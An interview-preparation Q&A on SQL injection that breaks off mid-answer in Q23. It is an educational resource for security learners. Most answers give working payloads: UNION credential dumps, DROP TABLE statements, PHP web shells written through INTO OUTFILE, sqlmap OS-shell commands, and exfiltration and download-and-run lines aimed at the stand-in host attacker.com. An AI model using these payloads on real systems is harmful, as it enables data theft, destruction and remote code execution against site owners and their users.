# SECURITY ENGINEER INTERVIEW PREP - PART 3
# SQL Injection - Complete Deep Dive
## Jagdeep Singh | 100 Real Q&A

---

## SECTION A: FUNDAMENTALS (Q1-25)

### Q1: What is SQL Injection?
**A:** SQL Injection (SQLi) is a code injection vulnerability where an attacker manipulates SQL queries executed by an application by inserting malicious SQL code into user input. The application unintentionally executes this attacker-controlled SQL, allowing them to read, modify, or delete database data, bypass authentication, execute administrative operations on the database, and in some cases execute commands on the underlying operating system.

**CVSS**: Typically 9.8 (Critical) — full database compromise

**Root cause**: String concatenation of user input into SQL queries instead of using parameterized queries.

### Q2: Why does SQL Injection happen?
**A:** SQLi exists because:

**1. String concatenation in queries:**
```python
# VULNERABLE
query = "SELECT * FROM users WHERE username = '" + username + "'"
```

**2. Trusting user input:**
- Developers assume input is "normal"
- No validation
- No escaping

**3. Dynamic query building:**
- Search functionality with multiple filters
- Sort columns from user input
- Table names from configuration

**4. Legacy code:**
- Old codebases built before secure patterns existed
- Not refactored

**5. ORM misuse:**
- ORM provides safe methods AND raw query methods
- Developers use raw methods incorrectly

**6. Stored procedures with dynamic SQL:**
- Even stored procs can be vulnerable

**7. Lack of awareness:**
- Junior developers
- No security training
- Copy-paste from insecure tutorials

### Q3: What are the main types of SQL Injection?
**A:** Three main categories:

**1. In-Band SQLi (Classic)**
- Attacker uses same channel for attack and results
- Two sub-types:
  - **Error-based**: Errors reveal data
  - **Union-based**: UNION operator combines results

**2. Blind SQLi (Inferential)**
- No direct data return
- Inferred through application behavior
- Two sub-types:
  - **Boolean-based**: True/false responses
  - **Time-based**: Response timing differences

**3. Out-of-Band SQLi**
- Data exfiltrated via different channel
- DNS, HTTP requests, file system
- Used when in-band fails

### Q4: Explain Union-based SQL Injection step by step
**A:**

**Setup:** Vulnerable query:
```sql
SELECT name, email FROM users WHERE id = $USER_INPUT
```

**Step 1: Identify injection point**
```
Input: 1
Query: SELECT name, email FROM users WHERE id = 1
Result: Returns user 1 info
```

**Step 2: Test for SQLi**
```
Input: 1'
Query: SELECT name, email FROM users WHERE id = 1'
Result: Syntax error (confirms input goes to SQL)
```

**Step 3: Determine number of columns**
```
Input: 1 UNION SELECT NULL
Query: SELECT name, email FROM users WHERE id = 1 UNION SELECT NULL
Result: "Number of columns mismatch" (we need 2 NULLs)

Input: 1 UNION SELECT NULL, NULL
Query: SELECT name, email FROM users WHERE id = 1 UNION SELECT NULL, NULL
Result: Works! 2 columns confirmed
```

**Step 4: Determine column data types**
```
Input: 1 UNION SELECT 'a', NULL
Result: Works → first column accepts strings

Input: 1 UNION SELECT NULL, 'a'  
Result: Works → second column accepts strings
```

**Step 5: Extract database info**
```
Input: 1 UNION SELECT @@version, NULL
Result: Database version revealed

Input: 1 UNION SELECT database(), NULL
Result: Current database name

Input: 1 UNION SELECT table_name, NULL FROM information_schema.tables
Result: All table names listed
```

**Step 6: Extract data**
```
Input: 1 UNION SELECT username, password FROM users
Result: All usernames and passwords returned
```

**Complete attack:**
```
http://site.com/profile?id=1 UNION SELECT username, password FROM admin_users--
```

### Q5: Explain Error-based SQL Injection
**A:**

**Concept:** Force database to generate errors that contain extracted data.

**MySQL example using EXTRACTVALUE:**

```sql
1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
```

Result error:
```
XPATH syntax error: '~5.7.31'
```

The version is now in the error message.

**Why it works:**
- EXTRACTVALUE expects valid XPATH
- We provide invalid XPATH containing our query result
- Database throws error, includes our content
- Error displayed to user

**Other MySQL error-based functions:**

```sql
-- UpdateXML
AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)), 1) --

-- Floor with double conversion
AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users LIMIT 1), FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) AS y) --
```

**MSSQL error-based:**

```sql
-- Convert function
1 AND CONVERT(INT, (SELECT TOP 1 password FROM users))

Error: "Conversion failed when converting the varchar value 'admin_password' to data type int."
```

**PostgreSQL error-based:**

```sql
1 AND CAST((SELECT password FROM users LIMIT 1) AS INTEGER)

Error: "invalid input syntax for integer: 'admin_password'"
```

**Oracle error-based:**

```sql
1 AND CTXSYS.DRITHSX.SN(1, (SELECT user FROM dual))
```

### Q6: Explain Boolean-based Blind SQL Injection
**A:**

**Concept:** No direct data return. Infer information by observing application behavior changes based on TRUE/FALSE conditions.

**Setup:** Application shows different content for valid vs invalid queries:
```
Valid query: "Welcome, John"
Invalid query: "User not found"
```

**Attack process:**

**Step 1: Confirm injection**
```
Input: 1 AND 1=1
Response: "Welcome, John" (TRUE condition)

Input: 1 AND 1=2  
Response: "User not found" (FALSE condition)

Different responses → SQLi confirmed
```

**Step 2: Extract data character by character**

Extract admin password length:
```
Input: 1 AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 10
Response: "User not found" → password not 10 chars

Input: 1 AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 12
Response: "Welcome, John" → password is 12 chars
```

Extract first character:
```
Input: 1 AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a'
Response: "User not found" → first char not 'a'

Input: 1 AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'p'
Response: "Welcome, John" → first char IS 'p'!
```

Continue for each character:
```python
# Pseudocode
password = ""
for position in range(1, 13):  # 12 chars
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        payload = f"1 AND (SELECT SUBSTRING(password, {position}, 1) FROM users WHERE username='admin') = '{char}'"
        response = send_request(payload)
        if "Welcome" in response:
            password += char
            break

# Result: password = "Password123!"
```

**Optimization: Binary search**

Instead of trying each character (26+10 attempts per char), use ASCII binary search:
```
SUBSTRING(password, 1, 1) > 'm'
Response TRUE: char is n-z (13 possibilities)
Response FALSE: char is a-m (13 possibilities)

Continue narrowing... ~5-7 requests per character vs 36
```

### Q7: Explain Time-based Blind SQL Injection
**A:**

**Concept:** No visible response change. Force database to delay response based on query results. Measure response time to infer information.

**Setup:** Application returns same response regardless of result (e.g., always "Request received").

**MySQL time-based payload:**

```sql
1 AND IF((SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'p', SLEEP(5), 0)
```

**How it works:**
- IF condition evaluates the SELECT
- If first char is 'p': SLEEP(5) executes → response delayed 5 seconds
- If not 'p': returns 0 immediately → no delay

**MSSQL time-based:**

```sql
IF (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'p' WAITFOR DELAY '0:0:5'
```

**PostgreSQL time-based:**

```sql
SELECT CASE WHEN (SUBSTRING(password,1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin'
```

**Oracle time-based:**

```sql
SELECT CASE WHEN (SUBSTRING(password,1,1)='p') THEN dbms_pipe.receive_message('a',5) ELSE 0 END FROM users WHERE username='admin'
```

**Detection threshold:**
```
Normal response: 50ms
With SLEEP(5): 5000-5100ms

If response > 4000ms → condition true
If response < 1000ms → condition false
```

**Why time-based is slower:**
- Each test takes minimum X seconds (the delay)
- Extracting 50-char password: 50 × 7 (binary search) × 5 seconds = ~30 minutes
- Much slower than boolean-based

**When to use time-based:**
- No visible response difference (Boolean blind fails)
- Application doesn't return data
- Out-of-band not possible

### Q8: Explain Out-of-Band (OOB) SQL Injection
**A:**

**Concept:** Use the database itself to send data to attacker-controlled server (DNS or HTTP).

**Useful when:**
- Direct response blocked/restricted
- WAF prevents in-band/blind techniques
- Application doesn't return errors or measurable timing

**MySQL via LOAD_FILE (Windows UNC):**

```sql
1' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\share')) --
```

**How it works:**
1. Subquery extracts password: `admin_password_123`
2. CONCAT builds UNC path: `\\admin_password_123.attacker.com\share`
3. LOAD_FILE attempts to read file from this path
4. Server makes DNS query for `admin_password_123.attacker.com`
5. Attacker controls authoritative DNS for `attacker.com`
6. DNS query logged with subdomain = extracted password

**Setup attacker DNS:**
```
Use tools like:
- Burp Collaborator (built-in)
- requestbin.io
- own DNS server
- dnsbin.org
- xss.ht (for XSS but works for OOB)
```

**MSSQL OOB:**

```sql
DECLARE @data VARCHAR(1024); 
SELECT @data = (SELECT TOP 1 password FROM users); 
EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"')
```

**Oracle OOB:**

```sql
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE rownum=1) || '.attacker.com') FROM dual
```

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT password FROM users WHERE rownum=1)) FROM dual
```

**PostgreSQL OOB:**

```sql
COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/?d=$(cat)'
```

(Requires high privileges)

**Benefits:**
- Works through WAFs that don't inspect DNS
- Doesn't need response from app
- Single request can extract multiple values
- Faster than time-based

**Detection of OOB:**
- Monitor outbound DNS queries from DB server
- Anomaly detection on DB process behavior
- Network egress filtering

### Q9: How do you systematically test for SQL Injection?
**A:**

**Step 1: Identify input points**
- URL parameters: `?id=1`
- Form fields: login, search, comments
- HTTP headers: User-Agent, Referer, X-Forwarded-For
- Cookies
- JSON/XML body data
- File upload metadata

**Step 2: Detect injection point**

**Test 1: Single quote**
```
Input: 1'
Look for: SQL syntax error
Examples: "You have an error in your SQL syntax", "ORA-00933", "unclosed quotation mark"
```

**Test 2: Comment indicators**
```
Input: 1' --
Input: 1' #
Input: 1' /*
```

**Test 3: Boolean conditions**
```
Input: 1 AND 1=1  → Normal response
Input: 1 AND 1=2  → Different response
Difference confirms SQLi
```

**Test 4: Math operations**
```
Input: 1+1   → If returns "User 2" → SQLi (math evaluated)
Input: 1*2   → Same
```

**Test 5: Time delays**
```
Input: 1' AND SLEEP(5) --
Response time > 5 seconds → SQLi
```

**Step 3: Identify database type**

Fingerprinting via syntax errors:
```
MySQL errors: "You have an error in your SQL syntax"
MSSQL errors: "Microsoft OLE DB Provider", "ODBC SQL Server"
PostgreSQL: "PostgreSQL query failed"
Oracle: "ORA-"
SQLite: "SQLITE_ERROR"
```

Specific queries:
```sql
-- MySQL
SELECT @@version
SELECT version()

-- MSSQL
SELECT @@version

-- PostgreSQL
SELECT version()

-- Oracle
SELECT banner FROM v$version
```

**Step 4: Choose attack technique**

```
Decision tree:
├── Errors visible? → Error-based
├── Different responses for true/false? → Boolean-based
├── Can use UNION? → Union-based
├── Only timing differs? → Time-based
└── Nothing visible? → Out-of-band
```

**Step 5: Exploit and extract**

Based on chosen technique:
- Enumerate databases
- List tables
- Extract sensitive data
- Test for privilege escalation

**Step 6: Document**
- Endpoint affected
- Payload used
- Database type
- Data extracted (proof)
- CVSS scoring
- Remediation

### Q10: How to identify the database type?
**A:**

**Method 1: Error messages**

Different databases throw different errors:

```
MySQL:
"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version"
"Warning: mysql_fetch_array() expects parameter 1"
"MySQL server version for the right syntax"

MSSQL:
"Microsoft OLE DB Provider for ODBC Drivers"
"ODBC SQL Server Driver"
"SqlException"
"Unclosed quotation mark"

PostgreSQL:
"PostgreSQL query failed"
"pg_query() expects"
"ERROR: syntax error at or near"

Oracle:
"ORA-00933: SQL command not properly ended"
"ORA-01756: quoted string not properly terminated"
"oracle.jdbc.driver"

SQLite:
"SQLITE_ERROR"
"near "...": syntax error"

DB2:
"DB2 SQL error"
"SQL0007N"
```

**Method 2: Database-specific syntax tests**

Concatenation operators differ:
```
MySQL: 'a' 'b' or CONCAT('a','b')
MSSQL: 'a' + 'b'
Oracle: 'a' || 'b'
PostgreSQL: 'a' || 'b'
SQLite: 'a' || 'b'
```

Test:
```
Input: 1 AND 'a'='a' (works in all)
Input: 1 AND 'a'+'b'='ab' (MSSQL works)
Input: 1 AND 'a'||'b'='ab' (Oracle/PostgreSQL/SQLite work)
```

**Method 3: Specific functions**

```
MySQL functions:
- @@version
- DATABASE()
- USER()
- @@hostname

MSSQL:
- @@VERSION
- DB_NAME()
- HOST_NAME()
- SUSER_NAME()

PostgreSQL:
- version()
- current_database()
- current_user

Oracle:
- (SELECT banner FROM v$version)
- (SELECT user FROM dual)

SQLite:
- sqlite_version()
```

**Method 4: Comment styles**

```
MySQL: # or -- (need space after) or /* */
MSSQL: -- or /* */
Oracle: --
PostgreSQL: -- or /* */
SQLite: --
```

**Method 5: Time-delay functions**

```
MySQL: SLEEP(5)
MSSQL: WAITFOR DELAY '0:0:5'
PostgreSQL: pg_sleep(5)
Oracle: dbms_pipe.receive_message
```

Try each, see which works.

**Method 6: Information schema queries**

```
MySQL/MSSQL/PostgreSQL: information_schema.tables
Oracle: ALL_TABLES or USER_TABLES
```

### Q11: How do you determine the number of columns in UNION-based SQLi?
**A:**

**Method 1: ORDER BY**

Increment until error:
```
Input: 1 ORDER BY 1 --   → OK
Input: 1 ORDER BY 2 --   → OK
Input: 1 ORDER BY 3 --   → OK
Input: 1 ORDER BY 4 --   → Error
Conclusion: 3 columns
```

**Method 2: UNION SELECT NULL**

Start with one NULL, increment:
```
Input: 1 UNION SELECT NULL --        → Error (column count mismatch)
Input: 1 UNION SELECT NULL, NULL --  → Error
Input: 1 UNION SELECT NULL, NULL, NULL -- → Works!
Conclusion: 3 columns
```

**Method 3: GROUP BY with high number**

```
Input: 1 GROUP BY 100 --   → Error
Then binary search down
```

**Why NULL?**
- NULL can be any data type
- Avoids data type mismatch errors
- Works for first attempt to find column count

### Q12: How do you identify which columns are displayed?
**A:**

After determining column count, identify which columns appear in response:

**Method 1: Number identification**

```
Input: 1 UNION SELECT 1, 2, 3 --
Response: Look for "1", "2", "3" in the page output
```

If page shows:
```
ID: [hidden]
Name: 2
Email: 3
```
Then columns 2 and 3 are displayed.

**Method 2: String identification**

```
Input: 1 UNION SELECT 'aaa', 'bbb', 'ccc' --
Look for 'aaa', 'bbb', 'ccc' in response
```

**Method 3: When column 0 is shown but not used**

Some apps:
- Hide first column (often ID)
- Display others

Test which columns reflect:
```
Input: -1 UNION SELECT 'col1', 'col2', 'col3' --
(Use -1 to ensure no real row matches)
```

**Important: Use -1 or non-existent ID**

If real row exists, you see legitimate data + injected data. Using -1 ensures only injected data shows, making analysis easier.

### Q13: How do you extract database schema (tables, columns) via UNION?
**A:**

**Step 1: List databases**

MySQL:
```sql
-1 UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata --
```

MSSQL:
```sql
-1 UNION SELECT name, NULL, NULL FROM master.sys.databases --
```

PostgreSQL:
```sql
-1 UNION SELECT datname, NULL, NULL FROM pg_database --
```

Oracle:
```sql
-1 UNION SELECT owner, NULL, NULL FROM all_users --
```

**Step 2: List tables in target database**

MySQL:
```sql
-1 UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema='target_db' --
```

MSSQL:
```sql
-1 UNION SELECT name, NULL, NULL FROM target_db.sys.tables --
```

PostgreSQL:
```sql
-1 UNION SELECT tablename, NULL, NULL FROM pg_tables WHERE schemaname='public' --
```

Oracle:
```sql
-1 UNION SELECT table_name, NULL, NULL FROM all_tables WHERE owner='TARGET_USER' --
```

**Step 3: List columns in target table**

MySQL:
```sql
-1 UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --
```

**Step 4: Concatenate multiple values for efficiency**

MySQL:
```sql
-1 UNION SELECT GROUP_CONCAT(username, ':', password SEPARATOR ', '), NULL, NULL FROM users --
```

Result: `admin:hash1, user1:hash2, user2:hash3, ...`

All credentials in one response.

**Step 5: Extract specific data**

```sql
-1 UNION SELECT username, password, email FROM users LIMIT 1 OFFSET 0 --
-1 UNION SELECT username, password, email FROM users LIMIT 1 OFFSET 1 --
-1 UNION SELECT username, password, email FROM users LIMIT 1 OFFSET 2 --
```

Or all at once with GROUP_CONCAT.

### Q14: What's authentication bypass via SQL Injection?
**A:**

**Classic SQLi auth bypass:**

**Vulnerable login query:**
```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass'
```

**Attack 1: Comment out password check**
```
Username: admin' --
Password: anything

Resulting query:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

The `--` comments out everything after, password check ignored. Returns admin row.

**Attack 2: Always-true condition**
```
Username: ' OR '1'='1' --
Password: anything

Resulting query:
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'
```

`1=1` always true. Returns all users. Typically first row used = admin.

**Attack 3: Numeric injection**
```
Username: admin
Password: ' OR 1=1 --

Resulting query:
SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1 --'
```

OR 1=1 makes entire WHERE clause true. Returns admin.

**Attack 4: Specific user**
```
Username: admin
Password: ' OR username='admin' --

Resulting query:
SELECT * FROM users WHERE username = 'admin' AND password = '' OR username='admin' --'
```

Logs in as admin without password.

**Attack 5: Database-specific bypasses**

MySQL specific:
```
Username: admin'#
(# is comment in MySQL)
```

MSSQL:
```
Username: admin'/*
```

**Why it's still common:**
- Quick development tutorials use string concatenation
- Legacy systems
- Custom auth code not using frameworks
- Junior developers

**Defense:**
- Parameterized queries
- Use authentication libraries (Devise, Passport, etc.)
- Hash passwords (so even bypass doesn't reveal real password)
- Never trust user input in queries

### Q15: What's Second-Order SQL Injection?
**A:**

**Concept:** Payload is stored in database without being immediately executed. Later, when stored data is retrieved and used in another query (without sanitization), the injection executes.

**Two-phase attack:**

**Phase 1: Inject (no immediate execution)**
```
Username registration: jagdeep'; DROP TABLE users; --
Server stores: "jagdeep'; DROP TABLE users; --" in users table
Storage is properly escaped → no injection here yet
```

**Phase 2: Retrieve and use (injection happens)**
```
Later, user updates profile:
SELECT * FROM users WHERE username = '<stored_value>'

Becomes:
SELECT * FROM users WHERE username = 'jagdeep'; DROP TABLE users; --'

Now injection executes!
```

**Real-world scenario:**

1. **Registration:** User enters malicious username
   ```
   Username: admin'-- 
   Stored properly: "admin'-- " is now in DB
   ```

2. **Password reset request:**
   ```
   Vulnerable query in password reset:
   UPDATE users SET reset_token = 'xxx' WHERE username = '<stored_username>'
   ```
   
3. **Becomes:**
   ```
   UPDATE users SET reset_token = 'xxx' WHERE username = 'admin'-- '
   ```
   
4. The `-- ` comments out everything, all users get the reset token, or token set incorrectly.

**Why it's dangerous:**
- Bypasses input validation focused on first query
- Hidden until used elsewhere
- Hard to detect

**Detection:**
- Code review for stored values in queries
- Trace data flow through application
- Test with stored injection payloads

**Defense:**
- Use parameterized queries EVERYWHERE
- Treat all data as untrusted, even from DB
- Don't trust data based on origin

### Q16: How does SQL Injection in stored procedures work?
**A:**

**Stored procedures CAN be vulnerable too!**

**Misconception:** "Stored procedures prevent SQL injection."
**Reality:** Only if they use parameterized queries internally.

**Vulnerable stored procedure (MSSQL):**

```sql
CREATE PROCEDURE GetUser
    @username NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(MAX)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)  -- Dynamic SQL execution!
END
```

**Attack:**
```
EXEC GetUser 'admin''; DROP TABLE users; --'
```

The procedure builds:
```sql
SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
```

Injection successful.

**Vulnerable MySQL stored procedure:**

```sql
CREATE PROCEDURE getUser(IN uname VARCHAR(50))
BEGIN
    SET @query = CONCAT('SELECT * FROM users WHERE username = ''', uname, '''');
    PREPARE stmt FROM @query;
    EXECUTE stmt;
END
```

**Safe stored procedure (parameterized):**

```sql
CREATE PROCEDURE GetUser
    @username NVARCHAR(50)
AS
BEGIN
    SELECT * FROM users WHERE username = @username
END
```

Direct parameter use, no string concatenation.

**Testing approach:**
- Don't assume stored procedures are safe
- Test parameters with SQLi payloads
- Look for behavior similar to direct SQL queries

### Q17: What is SQL Injection in WHERE clause vs INSERT vs UPDATE?
**A:**

**SQLi in WHERE clauses (most common):**

```sql
-- Vulnerable
SELECT * FROM products WHERE name LIKE '%$search%'

-- Attack: search = "' OR 1=1 --"
-- Result: SELECT * FROM products WHERE name LIKE '%' OR 1=1 --%'
```

**SQLi in INSERT:**

```sql
-- Vulnerable
INSERT INTO logs (user_id, action, details) VALUES ($user_id, 'login', '$details')

-- Attack: details = "', 'admin'); DROP TABLE users; --"
-- Result: 
-- INSERT INTO logs (user_id, action, details) VALUES (1, 'login', '', 'admin'); DROP TABLE users; --')
```

Or for UNION in INSERT:
```sql
INSERT INTO logs VALUES (1, (SELECT password FROM users WHERE username='admin'))
-- Steals data into a different table you can then read
```

**SQLi in UPDATE:**

```sql
-- Vulnerable
UPDATE users SET email = '$email' WHERE id = $user_id

-- Attack: email = "x', password = 'newpass' --"
-- Result: UPDATE users SET email = 'x', password = 'newpass' --' WHERE id = 1
-- Now also changes password!
```

**SQLi in ORDER BY:**

```sql
-- Vulnerable
SELECT * FROM products ORDER BY $column

-- Cannot use UNION here, but can use:
-- Attack: column = (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)
-- Boolean conditions in ORDER BY
```

**SQLi in LIMIT (MySQL):**

```sql
-- Vulnerable
SELECT * FROM products LIMIT $limit

-- Attack: limit = "1 INTO OUTFILE '/var/www/html/shell.php'"
-- Writes to file system if permissions allow
```

**SQLi in stored procedures parameters:**
Same techniques apply within procedure code.

### Q18: How does SQL Injection in JSON/NoSQL queries differ?
**A:**

**NoSQL Injection (MongoDB example):**

**Vulnerable Node.js code:**
```javascript
db.users.find({
  username: req.body.username,
  password: req.body.password
})
```

**Attack 1: Authentication bypass with operators**

Send JSON body:
```json
{
  "username": "admin",
  "password": {"$ne": null}
}
```

This becomes:
```javascript
db.users.find({
  username: "admin",
  password: {$ne: null}  // password "not equal to null"
})
```

Any non-null password matches admin's password = login as admin without knowing it.

**Attack 2: Always true with $or**

```json
{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}
```

Returns all users where username > "" and password > "" = all users.

**Attack 3: JavaScript injection (MongoDB $where)**

```json
{
  "username": "admin",
  "$where": "this.password == 'admin' || true"
}
```

**Attack 4: Regex extraction**

```json
{
  "username": "admin",
  "password": {"$regex": "^p"}
}
```

If returns user → password starts with 'p'. Extract character by character.

**Vulnerable PHP code:**
```php
$collection->find(array(
  "username" => $_POST['username'],
  "password" => $_POST['password']
));
```

PHP arrays can be sent via:
```
username[$ne]=admin&password[$ne]=anything
```

**Defense:**
- Validate input types (string only, not object)
- Sanitize user input
- Use schemas/ORMs that enforce types
- Avoid $where clauses with user input

### Q19: What are stacked queries (multi-query)?
**A:**

**Stacked queries** = Multiple SQL statements separated by `;`.

**Example:**
```sql
SELECT * FROM users WHERE id = 1; DROP TABLE users; --
```

Two queries: SELECT then DROP.

**Database support:**
- **MSSQL**: Supported by default
- **PostgreSQL**: Supported by default  
- **MySQL**: NOT supported via mysql_query() (PHP), but supported via mysqli with multi_query()
- **Oracle**: NOT supported
- **SQLite**: Supported

**Why most languages disable it:**
- PHP's mysql_query() and mysqli_query() execute only first query
- Defense-in-depth against SQL injection

**When stacked queries work, attacks include:**

**1. Data destruction:**
```sql
1; DROP TABLE users; --
1; DELETE FROM products; --
1; TRUNCATE TABLE logs; --
```

**2. Privilege manipulation:**
```sql
1; CREATE LOGIN attacker WITH PASSWORD = 'pwn'; --
1; GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%'; --
```

**3. Data insertion:**
```sql
1; INSERT INTO admin_users VALUES ('hacker', 'password', 'admin'); --
```

**4. Out-of-band (MSSQL):**
```sql
1; EXEC xp_cmdshell 'whoami'; --
```

**Testing for stacked queries:**

```sql
Input: 1; SELECT SLEEP(5) --
If response delayed 5s → stacked queries work
```

**MSSQL stacked exploitation:**
```sql
1; CREATE TABLE temp_data (data NVARCHAR(MAX)); 
INSERT INTO temp_data SELECT password FROM users; 
SELECT * FROM temp_data; --
```

### Q20: What is RAW SQL access via SQLi?
**A:**

**Goal:** Get interactive SQL shell-like access through SQL Injection.

**Technique 1: Burp Repeater for manual interactivity**

Modify each request to test different SQL. Tedious but works.

**Technique 2: SQLMap interactive mode**

```bash
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

After identifying SQLi, drops you into SQL prompt:
```
sql-shell> SELECT version();
[INFO] retrieved: 5.7.31

sql-shell> SELECT GROUP_CONCAT(username, ':', password) FROM users;
[INFO] retrieved: admin:hash1, user:hash2...

sql-shell> SHOW DATABASES;
```

**Technique 3: SQLMap OS shell**

If database supports OS commands:
```bash
sqlmap -u "http://target.com/page?id=1" --os-shell
```

Provides actual command shell:
```
os-shell> whoami
nt authority\system

os-shell> ipconfig
[Output]
```

**Technique 4: File read/write via SQLi**

MySQL:
```sql
-- Read file
1 UNION SELECT LOAD_FILE('/etc/passwd'), NULL --

-- Write file
1 UNION SELECT 'malicious_payload' INTO OUTFILE '/var/www/html/shell.php' --
```

Once shell.php uploaded, access:
```
http://target.com/shell.php?cmd=whoami
```

Now you have RCE.

**Technique 5: Reverse shell via SQLi**

PostgreSQL:
```sql
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php'
```

MSSQL with xp_cmdshell:
```sql
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'powershell -c "(New-Object Net.WebClient).DownloadFile(''http://attacker.com/shell.exe'',''C:\temp\s.exe''); Start-Process C:\temp\s.exe"';
```

### Q21: What's the CVSS scoring for SQL Injection?
**A:**

**Base SQLi CVSS factors:**

**Attack Vector**: Network (N)
**Attack Complexity**: Low (L) - common, well-known
**Privileges Required**: 
- None (N): pre-auth SQLi - critical
- Low (L): authenticated user
- High (H): admin only

**User Interaction**: None (N)
**Scope**: Often Changed (C) if leads to OS access

**Impact**:
- Confidentiality: High (H) - full DB read
- Integrity: High (H) - DB modify
- Availability: High (H) - DROP TABLE

**Typical scores:**

**Pre-auth SQLi with data exfiltration**: 9.8 (Critical)
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Post-auth SQLi**: 7.2 - 8.8 (High)
```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Score: 8.8
```

**Blind SQLi (slower exploitation)**: 7.5 (High)
- Same impact, slightly different perception

**SQLi leading to RCE (xp_cmdshell)**: 9.8 - 10.0 (Critical)
- Scope changes
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

**SQLi in admin panel (privileged)**: 7.2 (High)
- Requires admin to exploit
- But admin shouldn't need SQLi for data access anyway

### Q22: How do you escalate from basic SQLi to RCE?
**A:**

**Escalation paths:**

**Path 1: MSSQL xp_cmdshell**

```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "..."';
```

**Path 2: MySQL UDF (User-Defined Functions)**

```sql
-- Inject malicious .so/.dll
SELECT LOAD_FILE('/etc/passwd') INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';

CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';

SELECT sys_exec('whoami');
```

**Path 3: PostgreSQL COPY TO PROGRAM**

```sql
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell | bash';
```

(Requires high privileges)

**Path 4: File write to web root**

```sql
-- MySQL
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Then access:
-- http://target.com/shell.php?c=whoami
```

**Path 5: Oracle Java/PL/SQL exploitation**

Various Oracle-specific techniques with Java permissions.

**Path 6: Privilege escalation within DB then RCE**

1. SQLi as low-priv user
2. Find privilege escalation vuln in DB
3. Become DBA
4. Use DBA privileges for RCE

**Path 7: Through reading sensitive config**

```sql
-- Read config files
SELECT LOAD_FILE('/etc/mysql/my.cnf')
SELECT LOAD_FILE('/var/www/html/config.php')

-- Find credentials
-- Use credentials to access other systems
-- Pivot to RCE elsewhere
```

**Requirements for SQLi → RCE:**
- DB user with file/system privileges
- Knowledge of file paths
- File system access from DB

**Defense:**
- Run DB with minimal privileges
- Disable xp_cmdshell
- File access restrictions
- Network segmentation (DB can't talk to web root)

### Q23: How does parameterized query actually prevent SQLi?
**A:**

**Parameterized queries (prepared statements):**

**Database treats SQL structure and data SEPARATELY.**

**Step 1: Parse query template**
```sql
SELECT * FROM users WHERE username = ? AND password = ?
```

Database parses and compiles this. Knows:
- It's a SELECT
- From users table
- Two parameters in WHERE clause

**Step 2: Bind parameters**
```
Parameter 1: "admin' OR '1'='1"
Parameter 2: "anything"
```

**Step 3: Execute**

Database doesn't re-parse. Treats parameters as DATA only:
```sql
SELECT * FROM users WHERE username = "admin' OR '1'='1" AND password = "anything"
```

The literal string `admin' OR '1'='1` is searched for in username column. No SQL evaluation of the quotes.

**Why this works:**
- Structure already compiled
- Parameters can't change structure
- Quotes are just data, not delimiters

**Code examples:**

**Python (psycopg2):**
```python
# SAFE
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# NOT SAFE (formatted before sending)
cursor.execute("SELECT * FROM users WHERE id = %s" % user_id)
```

**PHP (PDO):**
```php
// SAFE
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

// NOT SAFE
$pdo->query("SELECT * FROM users WHERE id = $id");
```

**Java (PreparedStatement):**
```java
// SAFE
PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
pstmt.setInt(1, userId);

// NOT SAFE
Statement stmt = conn.createStatement();
stmt.executeQuery("SELECT * FROM users WHERE id = " + userId);
```

**Node.js (mysql2):**
```javascript
// SAFE - placeholder
connection.query('SELECT * FROM users WHERE id = ?', [userId]);

// NOT SAFE - string concatenation
